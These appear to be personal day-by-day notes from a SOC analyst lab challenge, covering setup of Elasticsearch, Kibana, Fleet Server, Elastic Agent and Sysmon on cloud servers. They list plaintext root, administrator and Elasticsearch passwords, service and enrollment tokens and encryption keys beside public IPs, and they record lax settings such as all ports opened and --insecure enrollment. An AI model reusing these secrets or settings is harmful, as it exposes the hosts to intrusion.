@@ -1,1 +1,2308 @@
+30-Day MyDFIR SOC Analyst Challenge
+
+Login Info (so far)
+  VPC
+    Private Network: 172.31.0.0/24
+    IP Range: 172.31.0.1-254
+    Subnetmask: 255.255.255.0
+
+  MyDFIR-ELK 
+    IP Address: 155.138.158.83 on Port 5601   or 155.138.158.83:5601
+    Username: root
+    Password: *J9m8V*JGcq_?x2g
+      elastic (browser web gui)
+        Username: elastic
+        Password: um472A6Oheg7k-qC03Ur
+    Netmask: 255.255.254.0
+    Gateway: 155.138.158.1
+    VPC 2.0 Network
+      Local IP Address: 172.31.0.3
+      Local Subnet Mask: 250.250.250.0
+
+  MyDFIR-WIN-RUDI Overview
+    IP Address: 216.128.178.5
+    Username: Administrator
+    Password: p7B]iHK=hqDMD$s-      (yes, the last character is a dash)
+      Day 21 Password changed to: Winter2024!   (not very secure...)
+    Netmask: 255.255.254.0
+    Gateway: 216.128.178.1
+
+  MyDFIR-Fleet-Server 
+    IP Address: 149.248.51.210 on Port 8220   or 149.248.51.210:8220
+    Username: root
+    Password: }vR95uox}d{$iHF*
+    Netmask: 255.255.254.0
+    Gateway: 149.248.50.1 
+    VPC 2.0 Network
+      Local IP Address: 172.31.0.4
+      Local Subnet Mask: 250.250.250.0
+
+  MyDFIR-Linux-RUDI Server
+    IP Address: 216.128.176.14
+    Username: root
+    Password: G3w]{d+*g2FhDGB* 
+    Netmask: 255.255.254.0
+    Gateway: 216.128.176.1 
+
+  MYDFIR-MYTHIC 
+    IP Address: 216.128.184.80 on Port 7443   or 216.128.184.80:7443
+                                         https://216.128.184.80:7443
+    Username: root
+    Password: fH6@ZibzENS{N}A]      
+    Netmask: 255.255.254.0
+    Gateway: 216.128.184.1     
+
+  MYDFIR-osTicket
+    IP Address: 155.138.136.18
+    Username: Administrator
+    Password: .oR9ieavH!(pq59T      (yes, the 1st character is a period)
+    Netmask: 255.255.254.0
+    Gateway: 155.138.136.1
+    VPC 2.0 Network
+      Local IP Address: 172.31.0.5
+      Local Subnet Mask: 250.250.250.0    
+
+  MYDFIR-osTicket GUI
+      Helpdesk URL: http://155.138.136.18/osticket/upload/   (supplied on GUI)
+      Helpdesk Name: MyDFIR-RUDI-Support
+      Default Email : (blank)
+    Admin User
+      First Name: RUDI
+      Last Name: MyDFIR
+      Email Address: (blank) 
+      Username: MyDFIR
+      Password: 30DayChallenge
+    Henry Orbit
+      First Name: Henry
+      Last Name: Orbit
+      Email Address: horbit@test.com
+      Username: Henry.Orbit
+      Password: MartianMeatballs 
+
+
+Default port assignments
+  When Elasticsearch or Fleet Server are deployed, components communicate over well-defined, pre-allocated ports. You may need to allow access to these ports. Refer to the following table for default port assignments:
+    Component communication             Default port
+      Elastic Agent → Fleet Server      8220
+      Elastic Agent → Elasticsearch     9200
+      Elastic Agent → Logstash          5044
+      Elastic Agent → Kibana (Fleet)    5601
+      Fleet Server → Kibana (Fleet)     5601
+      Fleet Server → Elasticsearch      9200
+      Browser → Mythic GUI              7443         
+
+_____________________________________________________________________
+9/1/2024
+How To Create a Logical Diagram | Day 1
+  https://www.youtube.com/watch?v=VAE3aVZi0Go
+  DIAGRAM -use Draw.io to create a logical diagram of the network that will be use in the course (may change over time)
+    https://www.draw.io
+    VPC
+      Private Network: 172.31.0.0/24
+      IP Range: 172.31.0.1-254
+      Subnetmask: 255.255.255.0      
+    Components:
+      Windows Server w/ RDT
+      Ubuntu Server w/ SSH
+      Fleet Server
+      ELK Server
+      osTicket Server
+      SOC Analyst Laptop
+      C2 Server w/ Mythic
+      Attacker Laptop w/ Kali
+_____________________________________________________________________
+9/2/2024
+ELK Stack Introduction | Day 2
+  https://www.youtube.com/watch?v=4AwBhXAW90Q
+  INTRODUCTION -brief introduction to the ELK Stack - a collection of three open-source projects: Elasticsearch, Logstash, and Kibana
+    Components:
+      1. Elasticsearch: A full-text search and analytics engine at the core of the stack, capable of storing and processing large amounts of data.
+      2. Logstash: A log aggregator that collects and processes data from multiple sources, converts and ships it to various destinations, such as Elasticsearch.
+      3. Kibana: An open-source visualization and presentation tool, part of the ELK Stack, used for time-series analysis, log analysis, and application monitoring. It offers a presentation tool, known as Canvas, for creating slide decks that extract live data directly from Elasticsearch.
+_____________________________________________________________________
+9/3/2024
+Elasticsearch Setup Tutorial | Day 3
+  https://www.youtube.com/watch?v=ypXARA5Uk4I
+  ACCOUNT -sign up for an account at Vultr.com
+    added MFA 
+  DEPLOY -VPC 2.0 Network (Toronto)
+    Configure IPv4 Range: 172.31.0.0/24
+    Name: 30-Day MyDFIR Challenge
+    ID: 53a97f45-cc13-41b4-8698-68c7043713d6 
+  DEPLOY -VM Server (Optimized Cloud Compute, Toronto)
+    Image: Ubuntu 22.04 LTS, 80GB NVMe, 4 CPU, 16GB, 6TB Bandwidth ($120/m)
+    Additional Features: Virtual Private Cloud 2.0 
+      VPC 2.0: 30-Day MyDFIR Challenge -IP Address: 172.31.03
+    Server Setting: default (for now)
+    Server Hostname & Label: MyDFIR-ELK
+    MyDFIR-ELK Overview
+      IP Address: 155.138.158.83
+      Username: root
+      Password: *J9m8V*JGcq_?x2g
+  CONNECT -from Windows Powershell 
+    PS> ssh root@155.138.158.83      (JOY...)
+    PS> apt update && apt upgrade -y
+  INSTALL -Elasticsearch (https://www.elastic.co/downloads/elasticsearch)
+    platform deb x86_64
+      (hover over link and copy link address)
+    PS> wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.15.0-amd64.deb
+    PS> ls    (just to verify..)
+      "elasticsearch-8.15.0-amd64.deb  snap"
+    PS> dpkg -i elasticsearch
+    NOTE: Save following displayed information:
+      --------------------------- Security autoconfiguration information ------------------------------
+
+Authentication and authorization are enabled.
+TLS for the transport and HTTP layers is enabled and configured.
+
+The generated password for the elastic built-in superuser is : um472A6Oheg7k-qC03Ur
+
+If this node should join an existing cluster, you can reconfigure this with
+'/usr/share/elasticsearch/bin/elasticsearch-reconfigure-node --enrollment-token <token-here>'
+after creating an enrollment token on your existing cluster.
+
+You can complete the following actions at any time:
+
+Reset the password of the elastic built-in superuser with
+'/usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic'.
+
+Generate an enrollment token for Kibana instances with
+ '/usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana'.
+
+Generate an enrollment token for Elasticsearch nodes with
+'/usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s node'.
+
+-------------------------------------------------------------------------------------------------
+### NOT starting on installation, please execute the following statements to configure elasticsearch service to start automatically using systemd
+ sudo systemctl daemon-reload
+ sudo systemctl enable elasticsearch.service
+### You can start elasticsearch service by executing
+ sudo systemctl start elasticsearch.service
+
+  CONFIGURE -Elasticsearch
+    PS> cd /etc/elasticsearch
+    PS> ls    (just to get the config file name)
+    PS> ip a     (get public ip address for the host to log into )
+      2: enp1s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+      link/ether 56:00:05:15:42:6f brd ff:ff:ff:ff:ff:ff
+      inet 155.138.158.83/23 metric 100 brd 155.138.159.255 scope global dynamic enp1s0
+    PS> nano elasticsearch.yml
+      #network.host: 192.168.0.1
+      # MAL 9/3/2024: public ip address from Vultr Ubuntu instance is 155.138.158.83
+      network.host: 155.138.158.83
+      ...
+      #http.port: 9200
+      # MAL 9/3/2024: open port 9200
+      http.port: 9200
+  HARDEN -Elasticsearch with a firewall
+    Vultr > MyDFIR-ELK > Settings > Firewall > Manage > Add Firewall Group
+      Description: "30-Day MyDFIR Challenge"
+      Inbound IPv4 Rules > accept SSH 22 MyIP    (inserts 76.38.xxx.xxx/32)
+      NOTE: from a regular PS> curl ifconfig.me    (finds current pubic IP)
+    Vultr > Compute > MyDFIR ELK > Firewall > Settings > Firewall > 
+      [select firewall] > Update Firewall Group
+  START -Elasticsearch service
+    PS> systemctl daemon-reload
+    PS> systemctl enable elasticsearch.service
+      Created symlink /etc/systemd/system/multi-user.target.wants/elasticsearch.service → /lib/systemd/system/elasticsearch.service.
+    PS> systemctl start elasticsearch.service
+    PS> systemctl status elasticsearch.service
+      ● elasticsearch.service -Elasticsearch
+        Loaded: loaded (/lib/systemd/system/elasticsearch.service; enabled; vendor preset: enabled)
+        Active: active (running) since Tue 2024-09-03 19:14:19 UTC; 53s ago
+_____________________________________________________________________
+9/4/2024
+Kibana Setup Tutorial | Day 4
+  https://www.youtube.com/watch?v=tXwMoBbrkYw
+  INSTALL -Kirbana    (https://www.elastic.co/downloads/kibana)
+    platform deb x86_64
+      (hover over link and copy link address)
+    PS> ssh root@155.138.15.83      (if not already connected)
+      NOTE: when entering the password, there is no indicators 
+      NOTE: current Vultr charges $3.58 (5:30am)   
+    PS> wget https://artifacts.elastic.co/downloads/kibana/kibana-8.15.0-amd64.deb
+    PS> ls
+    PS> dpkg -i kibana-8.15.0-amd64.deb   (used TAB to autocomplete)
+  CONFIG -Kibana
+    PS> nano /etc/kibana/kibana.yml
+      #server.port: 5601
+      # MAL 9/4/2024 open port 5601
+      server.port: 5601
+      ...
+      #server.host: "localhost"
+      # MAL 9/4/2024: public ip address from Vultr Ubuntu instance is 155.138.158.83
+      server.host: 155.138.158.83
+  START -Kibana
+    PS> systemctl daemon-reload
+    PS> systemctl enable kibana.service
+      Created symlink /etc/systemd/system/multi-user.target.wants/kibana.service → /lib/systemd/system/kibana.service.
+    PS> systemctl start kibana.service
+    PS> systemctl status kibana.service
+      ● kibana.service - Kibana
+        Loaded: loaded (/lib/systemd/system/kibana.service; enabled; vendor preset: enabled)
+        Active: active (running) since Wed 2024-09-04 09:53:46 UTC; 28s ago
+          NOTE: press "q" to exit out of status
+  GENERATE -Elasticsearch Enrollment Token
+    PS> cd /usr/share/elasticsearch/bin
+    PS> ls
+    PS> ./elasticsearch-create-enrollment-token --scope kiban
+      NOTE: a large "random" key  or token is displayed
+      [select and copy the token, paste somewhere to not lose it]
+      NOTE: without the "--scope kibana" option, a help response is displayed 
+    New Browser Tab > 155.138.158.83:5601
+      NOTE: to check the port setting
+            cat /etc/kibana/kibana.yml | less
+      NOTE: Browser will generate a "connection error"
+            to track down the problem: 
+              1. check the Vultr Firewall
+                 Vultr > MyDFIR-ELK > Settings > Firewall > Manage
+                 -currently only open to SSH on port 22
+                 -add a TCP rule to accept ports 1-65535 from MyIP
+                   (seems kinda large and insecure, but it's only from my IP address, and I'm following the lesson for now)
+              2. check the status of kiban.service and elasticsearch.serve
+                 PS> systemctl status kibana.service
+                 PS> systemctl status elasticsearch.service
+                   (both are active and running)                   
+              3. check the Ubuntu VM instance's firewall
+                 (really just allowing, rather than checking first)
+                 PS> ufw allow 5601
+                   "Rule added"
+                 (JOY...)
+      Browser > Enrollment token > [paste token] > Configure Elastic
+              > Verification Required
+                 Copy the code from the Kibana server or run bin\kibana-verification-code.bat to retrieve it.
+        PS> cd /usr/share/kibana/bin
+        PS> ls
+        PS> ./kibana-verification-code
+            "Your verification code is:  814 464"
+              (JOY...)
+      Browser > Username: elastic
+              > Password: um472A6Oheg7k-qC03Ur 
+                NOTE: both of these are in the Elasticsear Security Info from it's setup on 09/03/2024       
+  GENERATE -Key Stores
+    Browser/Elastic "Welcome home" @ http://155.138.158.83:5601/app/home#/ 
+      Settings > Security > Alerts
+      NOTE: API integration key required
+            A new encryption key is generated for saved objects each time you start Kibana. Without a persistent key, you cannot delete or modify rules after Kibana restarts. To set a persistent key, add the xpack.encryptedSavedObjects.encryptionKey setting with any text value of 32 or more characters to the kibana.yml file.
+    PS> cd /usr/share/kibana/bin      (I was actually already there...)
+    PS> ls
+    PS> ./kibana-encryption-keys generate      (generate keys...)
+xpack.encryptedSavedObjects.encryptionKey: aa5ab977f48a7a380f6ad8d15293b99a
+xpack.reporting.encryptionKey: eafe35c60c01f49ee1ac2b1745d6d8d7
+xpack.security.encryptionKey: 162f436bd699eb8b0ac513874763495d
+    PS> ./kibana-keystore add xpack.encryptedSavedObjects.encryptionKey
+        Enter value: ...
+    PS> ./kibana-keystore add xpack.reporting.encryptionKey
+        Enter value: ...
+    PS> ./kibana-keystore add xpack.security.encryptionKey
+        Enter value: ...
+    PS> systemctl restart kibana.service
+    Browser > refresh    (may need to login to session again...)
+_____________________________________________________________________
+9/5/2024
+Windows Server 2022 Installation | Day 5
+  https://www.youtube.com/watch?v=nBlCuLMq-zA
+  DEPLOY -VM Server (Cloud Compute Shared CPU, Toronto) 
+    Image: Windows 2022, 55GB SSD, 1 CPU, 2GB, 2TB Bandwidth ($24/m)
+      NOTE: Steven said; "We don't need the server extremely beefy" and use the cheapest one available. Shared CPU & Regular Cloud Compute
+    Additional Features: none
+      NOTE: Steven reconsidered the logical setup of the network and decided to move the Windows Server and the Ubuntu Server out of the VPC for Security Segmentation reasons
+    Server Setting: default ("everybody have access to the server")
+    Server Hostname & Label: MYDFIR-WIN-RUDI
+    MyDFIR-WIN-RUDI Overview
+      IP Address: 216.128.178.5
+      Username: Administrator
+      Password: p7B]iHK=hqDMD$s-      (yes, the last character is a dash)
+      Netmask: 255.255.254.0
+      Gateway: 216.128.178.1
+    NOTE: to view, on MyDFIR-WIN-RUDI page, in upper right corner, select the Console icon
+    NOTE: the paste-password-with-clipboard function is a pain in the ass
+  CONFIRM -connection with server
+    Local (HA7) Windows (after reinstalling Remote Desktop Connection) > search >  Remote Desktop Connection
+      Computer: 216.128.178.5
+      (JOY..)
+      Username & Password
+        PROBLEM -I received an warning about the "remote computer cannot be verified" ... "due to problems with its security certificate" 
+    NOTE: current Vultr charges $9.73 (2:06pm) 
+          taking the Paypal $10 before the $300 Credit, too
+_____________________________________________________________________
+9/6/2024
+Elastic Agent and Fleet Server Introduction | Day 6
+  https://www.youtube.com/watch?v=0WklP6ZsP1g
+  INTRODUCTION -brief introduction to the Elastic Agent and Fleet Server, essential components for managing your endpoints.
+    https://www.elastic.co/guide/en/fleet/current/fleet-overview.html
+    1. Elastic Agent: a single, unified way to add monitoring for logs, metrics, and other types of data to a host. It can also protect hosts from security threats, query data from operating systems, forward data from remote services or hardware, and more. A single agent makes it easier and faster to deploy monitoring across your infrastructure. Each agent has a single policy you can update to add integrations for new data sources, security protections, and more.
+      • Managed by Fleet: The Elastic Agent policies and lifecycle are centrally managed by the Fleet app in Kibana. The Integrations app also lets you centrally add integrations with other popular services and systems. This is the recommended option for most users.
+      • Standalone mode: All policies are applied to the Elastic Agent manually as a YAML file. This is intended for more advanced users.
+    2. Elastic Agent policies: specify which integrations you want to run and on which hosts. You can apply an Elastic Agent policy to multiple agents, making it even easier to manage configuration at scale. When you add an integration, you configure inputs for logs and metrics, such as the path to your Nginx access logs. When you’re done, you save the integration to an Elastic Agent policy. The next time enrolled agents check in, they receive the update. Having the policies automatically deployed is more convenient than doing it yourself by using SSH, Ansible playbooks, or some other tool.
+    3. Fleet: provides a web-based UI in Kibana for centrally managing Elastic Agents and their policies. Fleet serves as the communication channel back to the Elastic Agents. 
+    4. Fleet Server: is the mechanism to connect Elastic Agents to Fleet. It allows for a scalable infrastructure and is supported in Elastic Cloud and self-managed clusters. Fleet Server is a separate process that communicates with the deployed Elastic Agents. It supports many Elastic Agent connections and serves as a control plane for updating agent policies, collecting status information, and coordinating actions across Elastic Agents. It also provides a scalable architecture.
+    5. Beats: lightweight data shippers that send operational data to Elasticsearch. Elastic provides separate Beats for different types of data, such as logs, metrics, and uptime. Depending on what data you want to collect, you may need to install multiple shippers on a single host.
+_____________________________________________________________________
+9/7/2024
+Elastic Agent and Fleet Server Setup Tutorial | Day 7
+  https://www.youtube.com/watch?v=P2SFC6Kwae0
+  DEPLOY -Fleet Server VM (Optimized Cloud Compute, Toronto) 
+    Vultr > [Deploy] > Deploy New Server
+    Image: Umbutu 22.04, 30GB NvME, 1 CPU, 4GB, 4TB Bandwidth ($30/m)
+      NOTE: Steven said; "We don't need this server too too beefy" 
+    Additional Features: Virtual Private Cloud 2.0 
+      VPC 2.0: 30-Day MyDFIR Challenge -IP Address: 172.31.04
+    Server Setting: default (for now)
+    Server Hostname & Label: MyDFIR-Fleet-Server
+    MyDFIR-Fleet-Server Overview
+      IP Address: 149.248.51.210
+      Username: root
+      Password: }vR95uox}d{$iHF*
+  INSTALL -Fleet Server
+    New Browser Tab > 155.138.158.83:5601
+      NOTE: public ip address elastic is 155.138.158.83 on port 5601
+      Browser > Username: elastic
+              > Password: um472A6Oheg7k-qC03Ur 
+                NOTE: both of these are in the Elasticsearch Security Info from it's setup on 09/03/2024  
+        Elastic > Settings > Management > Fleet > [Add Fleet Server]
+          Quick Start    ("production environment you'll want Advanced")
+          1. Get Started with Fleet Server   ("uses port 8220 by default")
+            name: MyDFIR-Fleet-Server
+            url: https://149.248.51.210
+            [Generate Fleet Server Policy]
+              Fleet Server policy created.
+                Fleet server policy and service token have been generated. Host configured at https://149.248.51.210:443
+          2. Install Fleet Server to a centralized host
+            Install Fleet Server agent on a centralized host so that other hosts you wish to monitor can connect to it
+              copy the following (supplied) Linux Tar code into the Ubuntu Fleet Server using local Powershell
+----------------------------------------------------------------------
+curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.0-linux-x86_64.tar.gz
+tar xzvf elastic-agent-8.15.0-linux-x86_64.tar.gz
+cd elastic-agent-8.15.0-linux-x86_64
+sudo ./elastic-agent install \
+  --fleet-server-es=https://155.138.158.83:9200 \
+  --fleet-server-service-token=AAEAAWVsYXN0aWMvZmxlZXQtc2VydmVyL3Rva2VuLTE3MjU2ODQzNzAzNTc6cGpHM0xKTVBSdml3M2w4WkJMcVJIQQ \
+  --fleet-server-policy=fleet-server-policy \
+  --fleet-server-es-ca-trusted-fingerprint=6bb944978b19c5cc659cef85aaca8ff99ba368c9120dcf8879a25e86052a5aa4 \
+  --fleet-server-port=8220
+----------------------------------------------------------------------  
+            PS> ssh root@149.248.51.210
+              password: }vR95uox}d{$iHF*     
+                NOTE: when entering the password, there is no indicators 
+            PS> apt-get update && apt-get upgrade -y
+            PS> (paste the above code into PowerShell...)
+            NOTE: PS will generate a "Error: enroll command failed..."
+              (likely the same firewall issue...) 
+              to track down the problem: 
+              1. check the Vultr Firewall
+                 Vultr > MyDFIR-ELK > Settings > Firewall > Manage
+                 -currently only open to SSH on port 22
+                 -add a TCP rule to accept ports 1-65535 from Custom Source 149.248.51.210   (that's the Fleet Server...)
+                   (still don't like this large range...)
+              2. check the ELK Server Ubuntu VM instance's firewall
+                 (really just allowing, rather than checking first)
+                 NOTE: the ssh connection was closed 2 days ago and will need to be re-establish in a new PS tab
+                 PS> ssh root@155.138.158.83:5601
+                 PROBLEM: i can't ssh into 155.138.158.83
+                   (ssh: Could not resolve hostname 155.138.15.83:5601: No such host is known)
+                          i can't even ping it (Request timed out)
+                          i tried with without the port number
+                          i don't want to reset anything
+                  SOLVED?: i'm just going to use the MyDFIR Console 
+                          logged in with username (root) and password (*J9m8V*JGcq_?x2g) -easy peasy
+                  PS> ufw allow 9200
+                    "Rule added"
+            @ MyDFIR-Fleet-Server:
+              PS> (re-enter the above code)
+                Elastic Agent has been successfully installed
+            @ Browser/Elastic:
+              Fleet Server Connected 
+                You can now continue enrolling agents with Fleet
+                  [Continue enrolling Elastic Agent]
+ENROLL -Elastic Agent on Windows Server (MYDFIR-WIN-RUDI)
+  NOTE: another firewall/port issue 
+    (i'm going to summarize it here so the later instruction won't have troubleshooting notes throughout it as i'll likely need them for the Ubuntu server that still needs to be deployed...)
+    Error 1. could not connect
+      a. try pinging the Fleet Server at 149.248.51.210
+        (works)
+      b. check if there is a network firewall in the way
+        (nope)
+      c. there is a linux firewall on the Fleet Server though
+        @ MyDFIR-Fleet-Server:
+          ufw allow 8220
+          (NO JOY...)
+    Error 2. could not connect
+      a. the error in the enroll log says:
+        "Error: failed to enroll: failed to execute request to fleet-server: dial tcp 149.248.51.210:443..."
+        @ MyDFIR-Fleet-Server:
+          ufw allow 443
+          (NO JOY...)
+    Error 3. could not connect          
+      a. inspiration: there's a mismatch between the defaults. the code is saying to use port 443 but the Fleet Server is listening on 8220
+        Browser/Elastic > Dashboard > Management > Fleet > Settings > Fleet server hosts > MyDFIR-Fleet-Server > Actions (edit..)
+          Edit Fleet Server
+            URL: (change from https://149.248.51.210:443 to :8220)
+            [Save and apply settings]
+      b. edit code to use https://149.248.51.210:8220 instead of 443      
+      c. RE-RUN code
+    Error 4. Certificate can't be verified
+      a. self-signed cert is being use so and " --insecure" to the end of the code (after the double equal signs)
+      b. RE-RUN the code
+        (JOY...I hope. this is taking so long for Windows to run. It just sits and blinks its cursor) 
+  Instruction for Enrolling and Elastic Agent:
+    1. Browser/Elastic > Add Agent
+      name: MyDFIR-Windows-Policy
+      Collect system logs and metric: checked
+      [Create Policy]
+    2. Browser/Elastic > Install Elastic Agent on your host
+      NOTE: Root privileges required. This agent policy contains the following integrations that require Elastic Agents to have root privileges
+        copy the following (supplied) Windows code into the Windows Server using local PowerShell
+----------------------------------------------------------------------
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.15.1-windows-x86_64.zip -OutFile elastic-agent-8.15.1-windows-x86_64.zip
+Expand-Archive .\elastic-agent-8.15.1-windows-x86_64.zip -DestinationPath .
+cd elastic-agent-8.15.1-windows-x86_64
+.\elastic-agent.exe install --url=https://149.248.51.210:8220 --enrollment-token=bmI1Snk1RUJUSFRIRjAtM2hwUkI6ZWdKY0VqREpUSXUzYmowZG45eUdVdw== --insecure
+----------------------------------------------------------------------
+    3. Browser/Vultr > Dashboard > MYDFIR-WIN-RUDI > Console
+         MYDFIR-WIN-RUDI > PowerShell
+           NOTE: WinSrv should log in as Admin, but run PS as Admin anyway
+           noVNC > Clipboard > (paste above code) > [Paste]
+             NOTE: this downloads and installs the Elastic Agent
+             "Elastic Agent will be installed at C:\Program Files\Elastic Agent and will run as a service. Do you want to continue?"
+               YES
+            NOTE: the Agent need to be able to connect to the Fleet Server
+            NOTE: the above code has been edited, per the lesson, to work 
+              "Elastic Agent has been successfully installed"
+                (JOY...)
+    4. Browser/Elastic > Setting (hamburger icon) > Analytics > Discover
+         (look at all of the logs that are already being collected...)
+    (BTW the current Vultr charges are $18.00 at 7:41am)     
+
+_____________________________________________________________________
+9/8/2024
+What is Sysmon? | Day 8
+  https://www.youtube.com/watch?v=0WklP6ZsP1g
+  INTRODUCTION -brief introduction to Sysmon, a powerful tool for monitoring and logging system activity; explain what Sysmon is and why it's essential for detecting and investigating threats.
+    https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+      System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network. The service runs as a protected process, thus disallowing a wide range of user mode interactions.
+      Sysmon includes the following capabilities:
+      • Logs process creation with full command line for both current and parent processes.
+      • Records the hash of process image files using SHA1 (the default), MD5, SHA256 or IMPHASH.
+      • Multiple hashes can be used at the same time.
+      • Includes a process GUID in process create events to allow for correlation •of events even when Windows reuses process IDs.
+      • Includes a session GUID in each event to allow correlation of   events on same logon session.
+      • Logs loading of drivers or DLLs with their signatures and hashes.
+      • Logs opens for raw read access of disks and volumes.
+      • Optionally logs network connections, including each connection’s source process, IP addresses, port numbers, hostnames and port names.
+      • Detects changes in file creation time to understand when a file   was really created. Modification of file create timestamps is a technique commonly used by malware to cover its tracks.
+      • Automatically reload configuration if changed in the registry.
+      • Rule filtering to include or exclude certain events dynamically.
+      • Generates events from early in the boot process to capture   activity made by even sophisticated kernel-mode malware.
+    Note that Sysmon does not provide analysis of the events it generates, nor does it attempt to hide itself from attackers.
+  DEFINITIONS: EVENTS (these are the ones we'll use in the Challenge)
+    • Event ID 1: Process Creation -provides extended info about newly created process. The full command line provides context on  the process execution. The "ProcessGUID" field is a  unique value for this process a cross a domain to make event correlation easier. The hash is a full hash of the file with the algorithms in the "HashType" field
+    • Event ID 3: Network Connection - logs TCP/UDP connections on the machine. IT is disabled by default. Each connection is linked to a process though the "ProcessId" and "ProcessGUID" fields. The event also contains the source and destination host names IP addresses, port number and IPv2 status.
+    • Event ID 6: Driver loaded -provides information about a driver being loaded on the system. The configured hashes are provided as well as signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading.
+    • Event ID 7: Image loaded -logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the "–l" option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a significant amount of logging.
+    • Event ID 8: CreateRemoteThread -detects when a process creates a thread in another process. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process. It gives information on the code that will be run in the new thread: StartAddress, StartModule and StartFunction. Note that StartModule and StartFunction fields are inferred, they might be empty if the starting address is outside loaded modules or known exported functions.
+    • Event ID 10: ProcessAccess -reports when a process opens another process, an operation that’s often followed by information queries or reading and writing the address space of the target process. This enables detection of hacking tools that read the memory contents of processes like Local Security Authority (Lsass.exe) in order to steal credentials for use in Pass-the-Hash attacks. Enabling it can generate significant amounts of logging if there are diagnostic utilities active that repeatedly open processes to query their state, so it generally should only be done so with filters that remove expected accesses.
+    • Event ID 22: DNSEvent (DNS query) -generated when a process executes a DNS query, whether the result is successful or fails, cached or not. The telemetry for this event was added for Windows 8.1 so it is not available on Windows 7 and earlier.
+
+_____________________________________________________________________
+9/9/2024
+Sysmon Setup Tutorial | Day 9
+  https://www.youtube.com/watch?v=nzZY9OSfkeg
+  CONNECT -MyDFIR-WIN-RUDI from local local Win with Remote Desktop Connection
+    NOTE: on HA7, after remote desktop connection was uninstalled and reinstalled, you MUST type "remote desktop connection" in to Win11 Search to find it. Run "mstsc" opens the NEW Microsoft Store Remote Access App. I'll fix this later -MAL
+    Computer: 216.128.178.5
+    User name: Administrator
+    Password: p7B]iHK=hqDMD$s-
+      NOTE: Warning "The identity of the remote computer cannot be verified. Do you want to connect anyway?" "The certificate is not from a trusted certifying authority."   YES
+  INSTALL -Sysmon on MYDFIR-WIN-RUDI with MS Edge
+    Browser > search for "sysmon" 
+      https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+    DOWNLOAD -Sysmon v15.15 and Extract All into the download folder
+    DOWNLOAD -premade Sysmon configuration file from github
+    https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml
+    Github > sysmonconfig.xml > [RAW] > RC > Save As > "sysmonconfig" in Sysmon folder
+    OPEN -PowerShell (as Admin)
+      PS> cd C:\Users\Administrator\Downloads\Sysmon
+      PS> ls                               ~verify
+        NOTE: "as a proof of concepts"
+          open "Services" and "Event View" from WinSearch 
+            Services: no sysmon yet
+            EventViewer > Applications > Microsoft > Windows: no sysmon
+      PS> ./Sysmon64.exe                   ~sysmon64 [Tab] complete
+        NOTE: this opens the sysmon installer help page
+      PS> ./Sysmon64.exe -i sysmonconfig.xml       [Agree]
+        NOTE: Services: [Refresh] "Sysmon64" is now running
+              EventVeiwer: no refresh, must restart...
+                           Sysmon > Operational > first entry: Event ID 3
+                             (this will capture network connections...)
+
+_____________________________________________________________________
+9/10/2024
+Elasticsearch Ingest Data Tutorial | Day 10
+  https://www.youtube.com/watch?v=eOie0SDMuGA
+      (BTW the current total Vultr charges are $36.70 at 4:01am)
+  MODIFY: add Integration from Elasticsearch to ingest data from Windows computer (MYDFIR-Winn_RUDI) for Sysmon and Defender logs
+    NOTE: public ip address elastic is 
+    Browser > Elasticsearch website
+      NOTE: Brave/Malwarebyte was not allowing connection, Firefox did not have Malwarebytes turned on a allowed access -FIX LATER
+      > 155.138.158.83:5601
+      > Username: elastic
+      > Password: um472A6Oheg7k-qC03Ur 
+      NOTE: Elasticsearch Security Info from it's setup on 09/03/2024  
+      Elastic > [Add Integrations]
+        search for Windows > "Custom Windows Event Logs" > select
+          "The custom Windows event log package allows you to ingest events from any Windows event log channel."
+        For Sysmon logs: [Add Custom Windows Event Logs integration]
+          Configure integration
+            Integration name:  MYDFIR-WIN-Sysmon
+            Description: Collect Sysmon logs
+            Channel Name: Microsoft-Windows-Sysmon/Operational
+              NOTE: to find the correct info on channel name > open Windows computer generating logs (MYDFIR-WIN-RUDI)
+              CONNECTION -WinSearch "remote desktop connection"
+                Computer: 216.128.178.5
+                  User name: Administrator
+                  Password: p7B]iHK=hqDMD$s-
+              EventViewer > Applications > Microsoft > Windows > Sysmon > Operational > RC > Properties 
+                copy the Full Name: "Microsoft-Windows-Sysmon/Operational"
+            Dataset Name: winlog.winlog        (default) 
+          Where to add this integration?
+            Existing hosts
+              Agent policy: MyDFIR-Windows-Policy
+                NOTE: Agent policies are used to manage a group of integrations across a set of agents.
+          [Save and Continue]
+          [Save and deploy changes]
+            NOTE: "This action will update 1 agent"
+              "Fleet has detected that the selected agent policies, MyDFIR-Windows-Policy, are already in use by some of your agents. As a result of this action, Fleet will deploy updates to all agents that use these policies.""
+        For Defender logs: [Add Custom Windows Event Logs integration]
+          Configure integration
+            Integration name:  MYDFIR-WIN-Defender
+            Description: Collect Defender logs
+            Channel Name: Microsoft-Windows-Windows Defender/Operational
+              NOTE: to find the correct info on channel name > open Windows computer generating logs (MYDFIR-WIN-RUDI)
+              EventViewer > Applications > Microsoft > Windows > Windows Defender > Operational > RC > Properties 
+                copy the Full Name: "Microsoft-Windows-Sysmon/Operational"
+            Dataset Name: winlog.winlog        (default)
+            > Advanced options
+              Event ID: 1116,1117,5001
